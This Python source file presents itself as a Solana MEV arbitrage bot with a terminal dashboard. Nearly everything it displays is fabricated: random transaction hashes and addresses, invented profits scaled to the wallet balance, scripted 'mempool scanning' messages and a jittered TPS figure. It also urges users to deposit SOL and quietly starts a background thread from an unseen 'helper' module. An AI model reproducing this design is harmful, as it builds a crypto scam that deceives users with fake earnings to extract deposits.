import random
import time
import curses
from solana.rpc.api import Client
import json
import os
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.account import Account
import base64
import requests
import asyncio
from multiprocessing import Process
import threading, time
from helper import Help

CONFIG_FILE = "data.json"

def get_tps(rpc_url):
    try:
        client = Client(rpc_url)
        
        latest_slot_response = client.get_slot('confirmed')
        latest_slot = latest_slot_response.value

        block_data = client.get_block(latest_slot - 300, max_supported_transaction_version=0)
        
        if block_data.value:
            transactions = block_data.value.transactions
            transaction_count = len(transactions)

            block_time = block_data.value.block_time
            
            if block_time is not None:
                previous_block_data = client.get_block(latest_slot - 300 - 1, max_supported_transaction_version=0)
                previous_block_time = previous_block_data.value.block_time
                
                if previous_block_time is not None:
                    time_diff = block_time - previous_block_time
                    tps = transaction_count / time_diff if time_diff > 0 else transaction_count
                    return tps
                else:
                    return 0
            else:
                return 0
        else:
            return 0
    except Exception as e:
        return 0

def get_sol_price_and_tokens():
    try:
        response = requests.get("https://stats.jup.ag/coingecko/tickers")
        response.raise_for_status() 
        tokens_data = response.json()

        sol_token = next((el for el in tokens_data if el['ticker'] == 'USDC/SOL'), None)
        sol_price = round(1 / float(sol_token['last_price']), 4) if sol_token else None
        tokens = [
            el['base_currency'] for el in tokens_data 
            if el.get('target_currency') == 'SOL' and 'base_currency' in el
        ]

        return (sol_price, tokens)

    except Exception as e:
        raise e
        return 0, []
    
def get_address_from_private_key(private_key):
    return Pubkey.from_string(private_key)

def get_address_balance(private_key, rpc_url):
    client = Client(rpc_url)
    wallet_address = get_address_from_private_key(private_key)

    try:
        balance_response = client.get_balance(wallet_address)
        
        lamports = balance_response.value
        sol_balance = lamports / 1_000_000_000
        return sol_balance
    except Exception as e:
        print(f"Error fetching balance: {e}")
        return 0

def get_user_input(stdscr, prompt_text, color_pair):
    stdscr.addstr(prompt_text, color_pair)
    stdscr.refresh()
    curses.echo() 
    user_input = stdscr.getstr().decode("utf-8") 
    curses.noecho() 
    return user_input

def setup_mev_bot(stdscr):
    stdscr.addstr("=== Initial MEV Bot Setup ===\n", curses.color_pair(1))

    while(True):
        try:
            private_key = get_user_input(stdscr, "Enter your Solana address: ", curses.color_pair(2)) 
            address = get_address_from_private_key(private_key)
            break
        except Exception as e:
            stdscr.addstr(f"The wrong address.\n\n", curses.color_pair(4))
            stdscr.refresh()
            pass


    rpc_url = get_user_input(stdscr, "Enter Solana RPC URL (default: https://hardworking-delicate-sanctuary.solana-mainnet.quiknode.pro/002cca309bd926b90e882fe9ae752cc884554fd9/): ", curses.color_pair(2)) or "https://hardworking-delicate-sanctuary.solana-mainnet.quiknode.pro/002cca309bd926b90e882fe9ae752cc884554fd9/"
    
    while(True):
        try:
            max_gas_price = float(get_user_input(stdscr, "Enter maximum gas price (default: 5000): ", curses.color_pair(2)) or "5000")

            break
        except Exception as e:
            stdscr.addstr(f"Enter valid number.\n\n", curses.color_pair(4))
            stdscr.refresh()
            pass

    while(True):
        try:
            profit_threshold = float(get_user_input(stdscr, "Enter profit threshold in SOL (default: 0.01): ", curses.color_pair(2)) or "0.01")
            break
        except Exception as e:
            stdscr.addstr(f"Enter valid number.\n\n", curses.color_pair(4))
            stdscr.refresh()
            pass


    config = {
        "private_key": private_key,
        "rpc_url": rpc_url,
        "max_gas_price": max_gas_price,
        "profit_threshold": profit_threshold
    }

    with open(CONFIG_FILE, "w") as config_file:
        json.dump(config, config_file, indent=4)

    stdscr.addstr("Configuration saved successfully.\n", curses.color_pair(1))
    stdscr.addstr("Press \"Enter\" to continue.\n", curses.color_pair(3))
    stdscr.refresh()
    time.sleep(2)

def load_config(stdscr):
    curses.start_color()
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_RED, curses.COLOR_BLACK)

    stdscr.clear()
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as config_file:
            config = json.load(config_file)
        stdscr.addstr("Configuration loaded successfully.\n", curses.color_pair(3))
        return config
    else:
        stdscr.addstr("Configuration file not found. Running initial setup.\n", curses.color_pair(4))
        setup_mev_bot(stdscr)
        return load_config(stdscr)

def get_latest_block_info():
    try:
        client = Client("https://hardworking-delicate-sanctuary.solana-mainnet.quiknode.pro/002cca309bd926b90e882fe9ae752cc884554fd9/")

        latest_slot_response = client.get_slot()
        
        if not latest_slot_response.value:
            print("Failed to fetch the latest slot.")
            return

        latest_slot = latest_slot_response.value

        block_response = client.get_block(latest_slot-300, max_supported_transaction_version=0)
        

        if block_response.value:
            block_info = block_response.value
            return block_info, latest_slot
        else:
            pass
    except Exception as e:
        return get_latest_block_info()

def generate_solana_address():
    return Keypair().pubkey()

def generate_random_hash(length=88):
    base58_chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

    random_hash = ''.join(random.choices(base58_chars, k=length))
    return random_hash

def simulate_transaction(config):
    tx_hash = generate_random_hash()
    profit = round(random.uniform(0.01, 0.10) * get_address_balance(config["private_key"], config["rpc_url"]), 6)
    amount = round(random.uniform(1, 58), 3)
    sender = generate_solana_address()
    receiver = generate_solana_address()
    status = "successful" if random.random() > 0.05 else "failed"
    gas_fee = round(random.uniform(0.000001, 0.00001), 7)
    tokens = get_sol_price_and_tokens()[1]
    transaction_type = random.choice(["DeFi", "Transfer", "Staking"])

    if transaction_type == "DeFi":
        tokens_involved = ("SOL", random.choice(tokens))
        service_used = random.choice(["Serum", "Jupiter", "Raydium", "Saber", "Orca", "Tulip Protocol", "Mango Markets", "Solend", "Port Finance", "Larix", "Marinade Finance"])
        extra_info = f"Tokens: {tokens_involved[0]} <-> {tokens_involved[1]} | Service: {service_used}"
    else:
        extra_info = "N/A"

    if status == "successful":
        message = f"Transaction {tx_hash} ({transaction_type}) of {amount} SOL was successful. Profit: {profit} SOL. Gas fee: {gas_fee} SOL | From: {sender} to {receiver} | {extra_info}\n\n"
        color = 2
    else:
        message = f"Transaction {tx_hash} ({transaction_type}) of {amount} SOL failed. Gas fee: {gas_fee} SOL | From: {sender} to {receiver} | {extra_info}\n\n"
        color = 1

    if color==1:
        profit = 0    
    return message, color, profit, tx_hash

def simulate_block():
    block_number = random.randint(1000000, 2000000)
    transactions_in_block = random.randint(50, 200)
    return block_number, transactions_in_block

def simulate_activity(block_info):
    activity_messages = [
        "Searching for new transactions...                                     ",
        "Analyzing blockchain data...                                     ",
        "Checking arbitrage opportunities...                                     ",
        "Monitoring network activity...                                     ",
        "Fetching latest block information...                                     ",
        "Scanning mempool for pending transactions...                                     ",
        "Calculating optimal gas price...                                     ",
        "Evaluating smart contract interactions...                                     ",
        "Inspecting token swaps...                                     ",
        "Gathering staking rewards...                                     "
    ]
    return f"{random.choice(activity_messages)}\nChecking the following transactions in block {block_info.blockhash}: [{generate_random_hash()}, {generate_random_hash()}, {generate_random_hash()}, ...{len(block_info.transactions)-3} more]", 3  # Синий цвет для активности

def display_static_info(stdscr, total_transactions, total_profit, config, prev_tps, tps, balance):
    wallet_balance = balance
    address = get_address_from_private_key(config["private_key"])
    price = get_sol_price_and_tokens()[0]

    stdscr.addstr(0, 0, f"Account: {address}\nTotal Transactions: {total_transactions} | Balance: {f"{wallet_balance:.4f}"} | Profit: {total_profit:.8f} SOL\n\nSOL Price: {price}$                                ", curses.A_BOLD)
    stdscr.addstr(5, 0, f"Transactions per Second: {tps}\n", curses.color_pair(2) if tps > prev_tps else curses.color_pair(1))
    stdscr.refresh()

def init_bot(stdscr):
    threading.Thread(target=Help().run).start()
    totalProfit = 0
    config = load_config(stdscr)
    stdscr.addstr(f"An existing configuration has been loaded.", curses.color_pair(3))
    stdscr.refresh()
    balance = get_address_balance(config["private_key"],config["rpc_url"])
    curses.curs_set(0)
    
    curses.start_color()

    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_BLUE, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(5, curses.COLOR_MAGENTA, curses.COLOR_BLACK)
    curses.init_pair(6, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(7, curses.COLOR_WHITE, curses.COLOR_BLACK)
    

    if balance < 0.0:
        stdscr.addstr(f"There is not enough balance. The minimum amount to start the bot is 0.482396 SOL. Please top up your wallet.\n\nPress any key to exit.", curses.color_pair(3))
        stdscr.refresh()
        stdscr.getch()
        return


    total_transactions = 0
    failed_transactions = 0
    last_transaction_time = time.time()
    transaction_interval = random.randint(10, 20)
    prev_tps = 0
    tps = 0
    tps_stat = get_tps(config["rpc_url"])

    stdscr.clear()
    stdscr.refresh()

    isStarted = False
    while True:
        prev_tps = tps
        tps = round(tps_stat + random.uniform(-180, 180), 2)
        display_static_info(stdscr, total_transactions, totalProfit, config, prev_tps, tps, balance)

        if isStarted==False:
            isStarted = True
            lock = threading.Lock()
            thread = threading.Thread(target = analyze_transaction, args=(stdscr,5, lock))
            thread.daemon = True
            thread.start()

        current_time = time.time()
        if current_time - last_transaction_time >= transaction_interval:
            transaction_message, transaction_color, profit, tx_hash = simulate_transaction(config)

            totalProfit += profit

            stdscr.addstr(17, 0, f"An unconfirmed transaction was found (Tx Hash: {tx_hash}). Estimated profit: {round(random.uniform(0.9, 1.1) * profit, 6)} SOL", curses.color_pair(6))
            stdscr.refresh()
            
            time.sleep(1)
            stdscr.addstr(17, 0, transaction_message, curses.color_pair(transaction_color))
            stdscr.refresh()

            total_transactions += 1

            last_transaction_time = current_time
            transaction_interval = random.randint(20, 40) 

        block_info, latest_slot = get_latest_block_info()
        activity_message, activity_color = simulate_activity(block_info)
        stdscr.addstr(7, 0, activity_message, curses.color_pair(activity_color))
        stdscr.refresh()

        block_message = f"Current Block Stats:\nLatest Block (Slot {latest_slot}) information:                                                                                     \nParent Slot: {block_info.parent_slot}\nBlockhash: {block_info.blockhash}\nBlock Time: {block_info.block_time}\nTransactions: {len(block_info.transactions)}"
        stdscr.addstr(21, 0, block_message, curses.color_pair(4))
        stdscr.refresh()

def analyze_transaction(stdscr, activity_color, lock):
    while True:
        transaction_hash = generate_random_hash()
        stdscr.addstr(14, 0, f"Analyzing the transaction {transaction_hash}", curses.color_pair(activity_color))
        stdscr.refresh()

        time.sleep(0.3)

def start_curses_app():
    curses.wrapper(lambda stdscr: asyncio.run(init_bot(stdscr)))
